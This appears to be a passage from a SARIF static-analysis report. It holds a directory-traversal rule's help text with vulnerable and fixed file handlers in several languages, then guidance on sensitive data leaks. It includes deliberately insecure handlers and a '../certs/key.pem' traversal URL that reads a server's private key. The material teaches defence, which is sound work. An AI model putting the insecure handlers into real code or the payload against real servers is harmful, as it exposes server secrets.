filename = posixpath.join(static_directory, filename)\n\n  return send_file(filename)\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you can avoid it, it's preferable to not rely on user input for file names: just\nuse a unique name generated on the server-side instead. This could e.g. be a\ndatabase primary key, or a unique token generated with `secrets.token_urlsafe(32)`.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths.\nThe easiest way to achieve that is with functions such as `os.path.basename`.\nHowever, that would still let through special file names `.` and `..`, for which\nwe add special treatment:\n\n```python\nimport os.path\n\n@app.route('/menus')\ndef download_menu():\n  \"\"\"An more secure file handler does not allow directory traversal attacks.\"\"\"\n\n  filename         = request.args.get('menu')\n  safe_filename    = os.path.basename(filename)\n  if safe_filename == '..' or safe_filename == '.':\n    raise Exception(\"path traversal\")\n\n  static_directory = os.fspath(app.menu_folder)\n  filename         = os.path.join(static_directory, safe_filename)\n\n  return send_file(filename)\n```\n\nIn most web-servers you can have the server take care of this for you. The following function safely mounts \nthe `/var/etc/menus` directory as static content using the Flask web-server:\n\n```python\n@app.route('/menus/<path:path>')\ndef download_menu(path):\n    return send_from_directory('/var/etc/menus', path)\n```\n\n:::\n\n:::tab[Scala]\n\n## Directory Traversal in Scala\n\nPassing file paths in URLs is dangerous. Consider the following Scala application that hosts menus for a restaurant:\n\n```scala\ndef getMenu = Action { request =>\n  val menu = request.getQueryString(\"menu\")\n\n  if (menu.isEmpty) {\n    Redirect(\"/menus\")\n  }\n  else {\n    Ok.sendFile(new java.io.File(s\"/var/etc/menus/${menu.get}\"))\n  }\n}\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\` and`~`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to disallow *all* non-alphanumeric characters:\n\n```scala\ndef getMenu = Action { request =>\n  val menu = request.getQueryString(\"menu\")\n\n  if (menu.isEmpty) {\n    Redirect(\"/menus\")\n  }\n  else {\n    val safeFilename = menu.get.replaceAll(\"[^a-zA-Z0-9\\\\.]\",\"\")\n    Ok.sendFile(new java.io.File(s\"/var/etc/menus/${safeFilename}\"))\n  }\n}\n```\n\nIn most web-servers you can have the server take care of this for you. The following configuration safely mounts \nthe `/var/etc/menus` directory as static content using the `Assets` controller of the Play framework:\n\n```\nGET /menus/*menu controllers.Assets.at(path=\"/var/etc/menus\", menu)\n```\n\n:::\n\n:::tab[Go]\n\n## Directory Traversal in Go\n\nPassing file paths in URLs is dangerous. Consider the following Go application that hosts menus for a restaurant:\n\n```go\n// An insecure static file handler that allows directory traversal attacks.\nfunc MenuFileHandler(response http.ResponseWriter, request *http.Request) {\n  fileName := request.URL.Query().Get(\"menu\")\n\n  file, err := os.Open(staticFolder + fileName)\n\n  if err != nil {\n    http.Error(response, \"Error opening file\", http.StatusInternalServerError)\n    return\n  }\n\n  defer file.Close()\n\n  response.Header().Set(\"Content-Type\", \"application/pdf\")\n\n  io.Copy(response, file)\n}\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\` and`~`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to use a method like `filepath.Base` that strips any potential directory\ncomponents from a path. That only leaves `.`, `/` and `..` as special cases that could lead to unexpected behavior:\n\n```go\n// A more secure file handler does not allow directory traversal attacks.\nfunc MenuFileHandler0(response http.ResponseWriter, request *http.Request) {\n  fileName := filepath.Base(request.URL.Query().Get(\"menu\"))\n  if fileName == \".\" || fileName == \"/\" || fileName == \"..\" {\n    http.Error(response, \"Forbidden\", http.StatusForbidden)\n    return\n  }\n\n  file, err := os.Open(staticFolder + fileName)\n\n  if err != nil {\n    http.Error(response, \"Error opening file\", http.StatusInternalServerError)\n    return\n  }\n\n  defer file.Close()\n\n  response.Header().Set(\"Content-Type\", \"application/pdf\")\n\n  io.Copy(response,\n```\n\nIn most web-servers you can have the server take care of this for you. The following function safely mounts \na configurable directory as static content using the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  server.ListenAndServe()\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## Directory Traversal in PHP\n\nAllowing direct file references through user inputs can expose your application to Directory Traversal attacks. Consider this PHP script that fetches restaurant menus:\n\n```php\n$menuDirectory = \"/var/etc/menus\";\n$fileName = $_GET['menu'];\n\nheader(\"Content-Type: application/pdf\");\nheader(\"Content-Disposition: attachment; filename={$fileName}\");\n\n$file = $menuDirectory . DIRECTORY_SEPARATOR . $fileName;\nreadfile($file);\n```\n\nHere, the menu's filename is directly taken from the query string parameter. An attacker can manipulate this parameter, using patterns like `../`, to navigate out of the intended directory and access unintended files.\n\n## Mitigation\n\n1. **Input Sanitization**: Drop any directory references within filenames\n   received from the outside:\n\n```php\n$fileName = basename($_GET['menu']);\n```\n\n2. **Opaque File References**: Instead of direct file references, consider using an array or database of approved filenames, or encode actual file references, ensuring users can't directly specify paths. \n\n:::\n\n::::\n\n## Other Considerations\n\nIf your website is handling a lot of static documents, consider using or integrating a third-party *Content Management\nSystem* (CMS). These will generate secure paths for documents as they are uploaded and allow fine-grained permissions\nto be set.\n\n## Additional information\n\n**[CWE-22](https://cwe.mitre.org/data/definitions/22.html)**\n\n**[OWASP-A5](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control)**",
                                "text": "HTTP input data is used as part of a file path to read a file on the server without escaping or validation. This indicates a directory traversal vulnerability.\n\n# Directory Traversal\n\n**Directory traversal** vulnerabilities allow attackers to access arbitrary files on your server by manipulating HTTP\nparameters to include relative path syntax. It is important that you treat any parameters used to refer to files\nsecurely, or an attacker will be able to read sensitive data from your file system. Even better, avoid direct references\nto filenames altogether and use opaque identifiers and indirection instead.\n\n::::tabs\n\n:::tab[Java]\n\nPassing file paths in URLs is dangerous. Consider the following Java application that hosts menus for a restaurant:\n\n```java\npublic class UnsafeFileDownloadServlet\n{\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException\n    {\n        /**\n         * Taking the unfiltered filename from the HTTP request is dangerous -\n         * an attacker can use the \"../\" syntax in a filename to climb out of\n         * the intended directory.\n         */\n        final String fileName      = request.getParameter(\"menu\");\n        final String menuDirectory = \"/var/etc/menus\";\n\n        response.setContentType(\"application/pdf\");\n        response.setHeader(\"Content-disposition\", \"attachment; filename=\" + fileName);\n\n        try (OutputStream out = response.getOutputStream()) {\n            File file = new File(menuDirectory + File.separator + fileName);\n            Files.copy(file.toPath(), out);\n        }\n    }\n}\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to use a method like `FilenameUtils.getBaseName` that strips any potential directory\ncomponents from a path. That only leaves `.`, `..` and the empty string as\nspecial cases that could lead to unexpected behavior:\n\n```java\nimport org.apache.commons.io.FilenameUtils;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException\n    {\n        /**\n         * Removing anything except alphanumeric characters (and periods) will\n         * stop access to arbitrary directories.\n         */\n        final String fileName      = request.getParameter(\"menu\");\n        final String safeFileName  = FilenameUtils.getBaseName(fileName);\n        final String menuDirectory = \"/var/etc/menus\";\n\n\tif (\"\".equals(safeFileName) || \".\".equals(safeFileName) || \"..\".equals(safeFileName)) {\n\t    throw new SystemException(\"refusing to read a special directory name\");\n\t}\n\n        response.setContentType(\"application/pdf\");\n        response.setHeader(\"Content-disposition\", \"attachment; filename=\" + safeFileName);\n\n        try (OutputStream out = response.getOutputStream()) {\n            File file = new File(menuDirectory + File.separator + safeFileName);\n            Files.copy(file.toPath(), out);\n        }\n    }\n}\n```\n\nIn Java web applications you can have the server take care of this for you. The following configuration safely mounts \nthe `/var/etc/menus` directory as static content in a Jetty web-server:\n\n```xml\n<Configure class=\"org.eclipse.jetty.server.handler.ContextHandler\">\n  <Set name=\"contextPath\">/menus</Set>\n  <Set name=\"handler\">\n    <New class=\"org.eclipse.jetty.server.handler.ResourceHandler\">\n      <Set name=\"resourceBase\">/var/etc/menus</Set>\n      <Set name=\"directoriesListed\">false</Set>\n    </New>\n  </Set>\n</Configure>\n\n```\n\n:::\n\n:::tab[C#]\n\n## Directory Traversal in C#\n\nPassing file paths in URLs is dangerous. Consider the following ASP.NET Core controller method that hosts menus for a \nrestaurant:\n\n```csharp\n    [HttpGet(\"menus\")]\n    public IActionResult UnsafeFileDownload([FromQuery] string menu)\n    {\n        byte[] fileBytes = System.IO.File.ReadAllBytes(\"Static/menus/\" + menu);\n        return File(fileBytes, \"application/pdf\", menu);\n    }\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\` and`~`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to use a method like `Path.GetFileName` that strips any potential directory\ncomponents from a path. That only leaves `.`, `..` and the empty string as\nspecial cases that could lead to unexpected behavior:\n\n```csharp\n    [HttpGet(\"menus\")]\n    public IActionResult SaferFileDownload([FromQuery] string menu)\n    {\n        string baseName = System.IO.Path.GetFileName(menu);\n        if (baseName != \"\" && baseName != \".\" && baseName != \"..\") {\n            byte[] fileBytes    = System.IO.File.ReadAllBytes(\"Static/menus/\" + baseName);\n\n            return File(fileBytes, \"application/pdf\", menu);\n        } else {\n            return Forbid();\n        }\n    }\n```\n\nIn most web-servers you can have the server take care of this for you. The following snipped shows how to use the \nASP.NET Core Static File Middleware to safely mount the `/Static/Menus` directory as static content:\n\n```csharp\n  // This method gets called by the runtime. Use this method to configure the HTTP request pipeline.\n  public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n  {\n      if (env.IsDevelopment())\n      {\n          app.UseDeveloperExceptionPage();\n          app.UseMigrationsEndPoint();\n      }\n      else\n      {\n          app.UseExceptionHandler(\"/Home/Error\");\n          app.UseHsts();\n      }\n      \n      app.UseHttpsRedirection();\n      \n      // Mount the standard 'wwwroot' directory so files are accessible over HTTP.\n      app.UseStaticFiles();\n      \n      // Mount the local 'static/menus' directory so files are accessible over HTTP under the '/menus' path.\n      app.UseStaticFiles(new StaticFileOptions\n      {\n          FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"Static/Menus\")),\n          RequestPath = \"/menus\"\n      });\n      \n      app.UseRouting();\n\n      app.UseEndpoints(endpoints =>\n      {\n          endpoints.MapControllerRoute(\n              name: \"default\",\n              pattern: \"{controller=Home}/{action=Index}/{id?}\");\n          endpoints.MapRazorPages();\n      });\n   } \n```\n\n:::\n\n:::tab[JavaScript]\n\n## Directory Traversal in JavaScript\n\nPassing file paths in URLs is dangerous. Consider the following Express application that hosts menus for a restaurant:\n\n```javascript\nconst express = require('express')\nconst app     = express()\n\napp.get('/', (request, response) => {\n  response.send(\n    `<div>\n       <h1>Click on a menu to download it</h1>\n       <p><a href=\"/menu?menu=breakfast.pdf\"> Breakfast </a></p>\n       <p><a href=\"/menu?menu=lunch.pdf\">     Lunch     </a></p>\n       <p><a href=\"/menu?menu=dinner.pdf\">    Dinner    </a></p>\n     </div>`)\n})\n\nconst path = require('path')\n\napp.get('/menu', (request, response) => {\n\n  /**\n   * Taking the unfiltered filename from the HTTP request is dangerous -\n   * an attacker can use the \"../\" syntax in a filename to climb out of\n   * the intended directory.\n   */\n  const menuPath = path.resolve('menus/', request.query.menu)\n\n  response.download(menuPath)\n})\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\` and`~`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to disallow *all* non-alphanumeric characters:\n\n```javascript\napp.get('/menu', (request, response) => {\n\n  /**\n   * Removing anything except alphanumeric characters (excluding the extension) will\n   * stop access to arbitrary directories.\n   */\n  const suppliedFilename = request.query.menu\n  const match            = suppliedFilename.match(/([a-z0-9]+)\\.([a-z]+)/i)\n  const scrubbedFileName = match[1] + '.' + match[2]\n\n  const menuPath = 'menus/' + scrubbedFileName\n\n  response.download(menuPath)\n})\n```\n\nIn Express, you can have the server take care of this for you. The following code mounts the `/menus` directory as\nstatic content safely:\n\n```javascript\nconst express = require('express')\nconst app     = express()\n\napp.get('/', (request, response) => {\n  response.send(\n    `<div>\n       <h1>Click on a menu to download it</h1>\n       <p><a href=\"/menu/breakfast.pdf\"> Breakfast </a></p>\n       <p><a href=\"/menu/lunch.pdf\">     Lunch     </a></p>\n       <p><a href=\"/menu/dinner.pdf\">    Dinner    </a></p>\n     </div>`)\n})\n\n// Tell Express that the /menu directory contains static files that should be made\n// available to the browser.\napp.use('/menu', express.static('menus'))\n```\n\n:::\n\n:::tab[Python]\n\n## Directory Traversal in Python\n\nPassing file paths in URLs is dangerous. Consider the following Flask application that hosts menus for a restaurant:\n\n```python\n@app.route('/menus')\ndef download_menu():\n  \"\"\"An insecure static file handler that allows directory traversal attacks.\"\"\"\n\n  filename         = request.args.get('menu')\n  static_directory = os.fspath(app.menu_folder)\n\n  # The construction of the path here is incredibly insecure!\n  # If a path contains the \"..%2F\" pattern, it will be treated as\n  # ../ and a hacker can climb out of the static directory.\n  filename = posixpath.join(static_directory, filename)\n\n  return send_file(filename)\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you can avoid it, it's preferable to not rely on user input for file names: just\nuse a unique name generated on the server-side instead. This could e.g. be a\ndatabase primary key, or a unique token generated with `secrets.token_urlsafe(32)`.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths.\nThe easiest way to achieve that is with functions such as `os.path.basename`.\nHowever, that would still let through special file names `.` and `..`, for which\nwe add special treatment:\n\n```python\nimport os.path\n\n@app.route('/menus')\ndef download_menu():\n  \"\"\"An more secure file handler does not allow directory traversal attacks.\"\"\"\n\n  filename         = request.args.get('menu')\n  safe_filename    = os.path.basename(filename)\n  if safe_filename == '..' or safe_filename == '.':\n    raise Exception(\"path traversal\")\n\n  static_directory = os.fspath(app.menu_folder)\n  filename         = os.path.join(static_directory, safe_filename)\n\n  return send_file(filename)\n```\n\nIn most web-servers you can have the server take care of this for you. The following function safely mounts \nthe `/var/etc/menus` directory as static content using the Flask web-server:\n\n```python\n@app.route('/menus/<path:path>')\ndef download_menu(path):\n    return send_from_directory('/var/etc/menus', path)\n```\n\n:::\n\n:::tab[Scala]\n\n## Directory Traversal in Scala\n\nPassing file paths in URLs is dangerous. Consider the following Scala application that hosts menus for a restaurant:\n\n```scala\ndef getMenu = Action { request =>\n  val menu = request.getQueryString(\"menu\")\n\n  if (menu.isEmpty) {\n    Redirect(\"/menus\")\n  }\n  else {\n    Ok.sendFile(new java.io.File(s\"/var/etc/menus/${menu.get}\"))\n  }\n}\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\` and`~`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to disallow *all* non-alphanumeric characters:\n\n```scala\ndef getMenu = Action { request =>\n  val menu = request.getQueryString(\"menu\")\n\n  if (menu.isEmpty) {\n    Redirect(\"/menus\")\n  }\n  else {\n    val safeFilename = menu.get.replaceAll(\"[^a-zA-Z0-9\\\\.]\",\"\")\n    Ok.sendFile(new java.io.File(s\"/var/etc/menus/${safeFilename}\"))\n  }\n}\n```\n\nIn most web-servers you can have the server take care of this for you. The following configuration safely mounts \nthe `/var/etc/menus` directory as static content using the `Assets` controller of the Play framework:\n\n```\nGET /menus/*menu controllers.Assets.at(path=\"/var/etc/menus\", menu)\n```\n\n:::\n\n:::tab[Go]\n\n## Directory Traversal in Go\n\nPassing file paths in URLs is dangerous. Consider the following Go application that hosts menus for a restaurant:\n\n```go\n// An insecure static file handler that allows directory traversal attacks.\nfunc MenuFileHandler(response http.ResponseWriter, request *http.Request) {\n  fileName := request.URL.Query().Get(\"menu\")\n\n  file, err := os.Open(staticFolder + fileName)\n\n  if err != nil {\n    http.Error(response, \"Error opening file\", http.StatusInternalServerError)\n    return\n  }\n\n  defer file.Close()\n\n  response.Header().Set(\"Content-Type\", \"application/pdf\")\n\n  io.Copy(response, file)\n}\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\` and`~`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to use a method like `filepath.Base` that strips any potential directory\ncomponents from a path. That only leaves `.`, `/` and `..` as special cases that could lead to unexpected behavior:\n\n```go\n// A more secure file handler does not allow directory traversal attacks.\nfunc MenuFileHandler0(response http.ResponseWriter, request *http.Request) {\n  fileName := filepath.Base(request.URL.Query().Get(\"menu\"))\n  if fileName == \".\" || fileName == \"/\" || fileName == \"..\" {\n    http.Error(response, \"Forbidden\", http.StatusForbidden)\n    return\n  }\n\n  file, err := os.Open(staticFolder + fileName)\n\n  if err != nil {\n    http.Error(response, \"Error opening file\", http.StatusInternalServerError)\n    return\n  }\n\n  defer file.Close()\n\n  response.Header().Set(\"Content-Type\", \"application/pdf\")\n\n  io.Copy(response,\n```\n\nIn most web-servers you can have the server take care of this for you. The following function safely mounts \na configurable directory as static content using the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  server.ListenAndServe()\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## Directory Traversal in PHP\n\nAllowing direct file references through user inputs can expose your application to Directory Traversal attacks. Consider this PHP script that fetches restaurant menus:\n\n```php\n$menuDirectory = \"/var/etc/menus\";\n$fileName = $_GET['menu'];\n\nheader(\"Content-Type: application/pdf\");\nheader(\"Content-Disposition: attachment; filename={$fileName}\");\n\n$file = $menuDirectory . DIRECTORY_SEPARATOR . $fileName;\nreadfile($file);\n```\n\nHere, the menu's filename is directly taken from the query string parameter. An attacker can manipulate this parameter, using patterns like `../`, to navigate out of the intended directory and access unintended files.\n\n## Mitigation\n\n1. **Input Sanitization**: Drop any directory references within filenames\n   received from the outside:\n\n```php\n$fileName = basename($_GET['menu']);\n```\n\n2. **Opaque File References**: Instead of direct file references, consider using an array or database of approved filenames, or encode actual file references, ensuring users can't directly specify paths. \n\n:::\n\n::::\n\n## Other Considerations\n\nIf your website is handling a lot of static documents, consider using or integrating a third-party *Content Management\nSystem* (CMS). These will generate secure paths for documents as they are uploaded and allow fine-grained permissions\nto be set.\n\n## Additional information\n\n**[CWE-22](https://cwe.mitre.org/data/definitions/22.html)**\n\n**[OWASP-A5](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control)**"
                            },
                            "helpUri": "https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control",
                            "id": "arbitrary-file-read/1403735270298b846b13b9261e31cf58",
                            "name": "Directory Traversal: Http Data As File Path Via Req In Imagelookup.js:get",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "8",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 8",
                                    "CWE 22",
                                    "Directory Traversal",
                                    "OWASP 2021 a01-broken-access-control",
                                    "OWASP a01-2021-broken-access-control",
                                    "OWASP a5-broken-access-control"
                                ]
                            },
                            "shortDescription": {
                                "text": "Directory Traversal: HTTP Data as File Path via req in ImageLookup.js:get"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Sensitive data is logged in this flow."
                            },
                            "help": {
                                "markdown": "Sensitive data is logged in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. 